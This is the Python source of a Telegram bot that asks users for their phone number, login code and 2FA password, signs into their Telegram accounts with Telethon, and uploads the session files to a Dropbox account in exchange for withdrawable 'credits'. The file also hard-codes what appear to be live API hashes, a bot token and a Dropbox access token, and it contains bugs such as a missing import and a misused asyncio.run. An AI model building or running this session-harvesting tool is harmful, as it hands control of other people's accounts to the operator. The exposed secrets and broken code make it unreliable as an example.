
# ---- Your Telegram API keys ----
# ---- Your Telegram API keys ----
import os
import json
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient, errors
import dropbox



from telethon import TelegramClient
from telethon.sessions import StringSession
from dotenv import load_dotenv

# === Telegram API Credentials ===
api_id = 28805917
api_hash = '72b4ff10bcce5ba17dba09f8aa526a44'

# === Proxy Settings ===
# 1) load .env
load_dotenv()

# 2) read creds
api_id   = int(os.getenv("API_ID"))
api_hash = os.getenv("API_HASH")


# === Create Telethon Client ===


# ---- Your Telegram API keys ----
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAEiDRtbiaLXMwWotB039Gk4gjYaEtDrGNE"

# ---- Dropbox API Integration ----
DROPBOX_ACCESS_TOKEN ="sl.u.AFs7Glm7FYivnKaQJZ-LKQz_2xHtfF7As9yVIiANnoxnyfn0V-PMYM9IFfshJovFvRxzwB47JNhMNq5ezCZQrgHsKLKp94DGUifLY0sJzlTHK5y-54prjR-4By466OingsbDwULJbMiv2h1fYJeQZHNUbt6ddBCb_xW_RQraiwVQGbtfYkHV2GRdMtasY7a5UIZgKjQJ4tt8DAF5xi9S9qypkLv94YF-quaSaT9KbvCPdZpjkVxApy-A5rXmnd16aJvK4dQE9kND1RbVWMKWye68HFWeNlncL4xwi_DoX4qaMwqKYytyn_I3psPE2Jjen6Agup8d6-kTSrRG80OtvA9Ge7X3e4SMEm29kjMcWrgSOMVkrgxNtkm8i_y72vYMiu7pckRM5XGz6Q8uUV7MeqQEuWpzZlBRJG44buAEujlZGUlp578W7OoCGs4VQAbZGOFty7fLDEzsJKo_06-CuIAkNOGsw2g2EteK8V7Ql-_xWrtRdtq-dlKIEW48fALY77wS7wT4GP8d80ML30QuGcUJvVEIdsi0TMuDYICoFEeruzV4ZqYh73DaPCjCI-NWKFjJAoz10BiCnHT29e_sCDPMWYIznChr19nB-GLSp7Wxb5sNzqthmspBQe44sQua4sFLMEE5GzQSMLJ-d9iMqh24kKo9REMbq10HOF4LFnTmXnbVxiF8t4Uk9gTH87i5SZQqeHV1-8eyC7PGC4M32jlu-5GvhAaACz_5BVEG2NENspd-NsDfnQsyworhRSdrlIOlmILPO2wMcA_ZiiWYMeEyYqzMbGHpIT1C3gt6rJ9-T2DSQ6YwoQ5KmmlScIaPc2DWcY30hmA9S1qxI3hWM68kuiI_M7t3dtTObRdOcw8rvKaYfSHSalRcdGAbGLe1RlcOuQ9eTVBP0DKps_zda1SqW2NxIq6nugVGmlQoDyQG-MO1BJIR9APgB2UdVLk3ro9jVYGO_gAseDBuGzjR_EVrpwSWBQMALVzuGaOOJ-8Xmiz6R0hNuEzMEwIJ2eRRq5WzUsVpxeOF-VTqVdTQgKigOCUo9ETDafkDY7cUip411XE_-3nbwUYqq9_MPmCs5aM0C4lsHkroFfOaEf_mwQC92NC3iUr0Fwssfw0zgYvcB62C0-Z8aiGfD42S8Toirgdc7QB4QBmt3hzlEsqyuGhqHuBY8F8869TCGMePHrAVUbipoWSJ85m36SplHIVw46zH3wM6qRWiihVYpzN6aCdo78ix6YL0nMRbQ6NZhxqj7US4zv4CRH36SRgG5X3ZjgtcWiV3ii11RP1MC5GEvMcpd6z_E2PdV6C3khshd_CcLsOipAEHOeDgLuR9cx8XjCm2utoE4rBsaDRW3gTADQW2J8p8gEYaeD3CgPr34kYaC5VgSJ_pQnCPRfHIwPAXR86hB0krxKGwZwPRYUEwAtufb84R8at8uOT6H8P1R0Yc5_4blk-sO4lh5iWp6gZzygk"
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)







# ---- States for Conversation ----
ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)

# ---- Dictionary to track users' login states ----
user_sessions = {}

# ---- Path to store credit files ----
CREDITS_FILE = "/credits.json"

async def load_credits():
    try:
        _, res = dbx.files_download(CREDITS_FILE)
        return json.loads(res.content)
    except dropbox.exceptions.ApiError as e:
        if "not_found" in str(e.error).lower():
            return {}
        raise

async def save_credits(credits: dict):
    dbx.files_upload(
        json.dumps(credits).encode(),
        CREDITS_FILE,
        mode=dropbox.files.WriteMode("overwrite")
    )
    
async def add_credit(user_id, amount, number_sent=None):
    credits = await load_credits()
    key = str(user_id)
    if key not in credits:
        credits[key] = {"credits": 0, "numbers": []}
    
    credits[key]["credits"] += amount
    
    if number_sent:
        credits[key]["numbers"].append(number_sent)
    
    await save_credits(credits)
    return credits[key]["credits"]

    
# ---- Get Credit for User ----

async def get_user_credits(user_id):
    credits = await load_credits()
    return credits.get(str(user_id), 0)  # Default to 0 if no credit file exists

# ---- Start Command ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
    return ASK_PHONE

# ---- Command to withdraw credits ----
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    credits = await load_credits()

    if user_id not in credits or credits[user_id]["credits"] == 0:
        await update.message.reply_text("❌ You have no credits to withdraw.")
        return

    user_credits = credits[user_id]["credits"]
    submitted_numbers = credits[user_id]["numbers"]

    # Send notification to admin
    admin_id = 1155949927  # <-- Replace with your own Telegram user ID
    notification_message = (
        f"📢 *Withdraw Request Received!*\n\n"
        f"👤 User: {user.full_name} (@{user.username})\n"
        f"🆔 User ID: {user_id}\n"
        f"💰 Credits Requested: {user_credits}\n"
        f"📱 Numbers Submitted:\n" +
        "\n".join(submitted_numbers)
    )
    
    await context.bot.send_message(chat_id=admin_id, text=notification_message, parse_mode="Markdown")
    await update.message.reply_text("✅ Your withdrawal request has been sent to the admin.")

    # Reset user's credits after withdrawal
    credits[user_id]["credits"] = 0
    credits[user_id]["numbers"] = []
    await save_credits(credits)

# ---- Handle Phone Number ----
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    # Create a new Telethon client for this user
    session_name = f"sessions/{phone}"  # Saving sessions inside 'sessions' folder
    os.makedirs("sessions", exist_ok=True)

    client = TelegramClient(
        session_name,  # <--- this instead of StringSession()
        api_id,
        api_hash,
    )

    await client.connect()

    try:
        sent = await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone}
        await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
        return ASK_CODE
    except errors.PhoneNumberInvalidError:
        await update.message.reply_text("❌ Invalid phone number. Please send a valid one.")
        await client.disconnect()
        return ASK_PHONE

# ---- Handle OTP Code ----
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]

    try:
        await client.sign_in(phone, code)
        await update.message.reply_text("✅ Logged in successfully!")

        # Add 1 credit after successful login
        new_credit_balance = await add_credit(user_id, 1, phone)
  # Adding 1 credit as an example

        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, phone)

        await client.disconnect()

        # Inform the user that their credits have been updated
        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")

        return ConversationHandler.END

    except errors.SessionPasswordNeededError:
        await update.message.reply_text("🔒 2FA is enabled. Please send your password.")
        return ASK_PASSWORD

    except errors.PhoneCodeInvalidError:
        # If wrong code, offer retry or skip
        reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
        return ASK_CODE

# ---- Handle Retry or Skip ----
async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text == "retry":
        await update.message.reply_text("🔁 Okay, please send the code again.")
        return ASK_CODE
    else:
        user_id = update.message.from_user.id
        session = user_sessions.get(user_id)
        if session:
            await session["client"].disconnect()
            user_sessions.pop(user_id, None)
        await update.message.reply_text("⏩ Skipped. Use /start to begin again.")
        return ConversationHandler.END

# ---- Handle 2FA Password ----
async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]

    try:
        await client.sign_in(password=password)
        await update.message.reply_text("✅ Logged in successfully with 2FA!")

        # Add 1 credit after successful login
        new_credit_balance = await add_credit(user_id, 1, session["phone"])


        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, session["phone"])

        await client.disconnect()

        # Inform the user about their credits
        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")

        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        await update.message.reply_text("❌ Incorrect password. Please send again.")
        return ASK_PASSWORD

# ---- Upload Session File to Dropbox ----
async def upload_session_to_dropbox(client, phone):
    """Uploads session file to Dropbox"""
    session_file_path = f"sessions/{phone}.session"  # <-- ADD ".session"
    dropbox_path = f"/sessions/{phone}.session"      # <-- ADD ".session"

    if not os.path.exists(session_file_path):
        print(f"❌ Session file not found for {phone}. Skipping upload.")
        return

    with open(session_file_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        
    print(f"✅ Session file for {phone} uploaded to Dropbox.")

# ---- Command to check credits ----
async def check_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    # Get the user's credit balance
    credit_balance = await get_user_credits(user_id)
    
    # Send a message with the current credit balance
    await update.message.reply_text(f"💳 Your current credit balance is: {credit_balance} credits.")

# ---- Cancel Command ----
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ---- Main Function ----
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [
                MessageHandler(filters.Regex("^(Retry|Skip)$"), ask_code_retry),
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)
            ],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    # Add the /credits command handler to check credits
    app.add_handler(CommandHandler("credits", check_credits))
    app.add_handler(CommandHandler("withdraw", withdraw))

    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
